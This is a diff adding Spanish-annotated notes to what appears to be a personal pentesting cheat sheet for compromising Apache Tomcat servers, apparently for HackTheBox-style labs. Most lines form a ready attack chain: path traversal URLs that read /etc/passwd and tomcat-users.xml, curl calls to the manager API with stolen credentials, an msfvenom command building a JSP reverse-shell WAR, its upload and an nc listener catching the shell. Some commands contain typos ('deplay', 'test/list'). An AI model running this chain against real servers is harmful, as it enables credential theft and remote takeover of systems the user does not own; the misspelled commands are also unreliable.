@@ -1,5 +1,36 @@
 
+
+			"Tomcat suele correr en el puerto 8080"
+
 google::  tomcat default password
 
 
-http://ipTarged/manager/html              loginPanel
+			http://ip_Targed/manager/html              loginPanel
+
+			http://ip_Targed:8080/manager/html
+			http://ip_Targed:8080/host-manager/html					"si el anterior falla este suele ir ok"
+
+
+
+*** *** Tomcat 9
+
+		/etc/tomcat9/tomcat-users.xml
+		
+		http://targed.htb/someting.php?file=../../../../../../../../../../../etc/passwd					"Ctrl-u en el navegador para que sea mas legible"
+
+		http://targed.htb/someting.php?file=../../../../../../../../../../../usr/share/tomcat9/etc/tomcat-users.xml    "Ctrl-u en el navegador para que sea mas legible"
+
+				<user username="user_Here_Tomcat" password="password_Here_userTomcat" roles="admin-gui,manager-script"/>
+
+
+
+*** *** Tomcat ADVANCED
+
+		::: curl -s -u 'user_Here_Tomcat:password_Here' -X GET "http://targed_here:8080/manager/test/list"
+
+		::: msfvenom -p java/jsp_shell_reverse_tcp LHOST=$(mvnb --vpn) LPORT=443 -f war -o reverse.war
+
+		 :: curl -s -u 'tomcat_User:password_User_tomcat' "http://ip_Targed.htb:8080/manager/text/deplay?path=/pwned" --upload-file reverse.war
+
+				:: nc -nlvp 443
+				firefox::: http://ip_Targed:8080/pwned
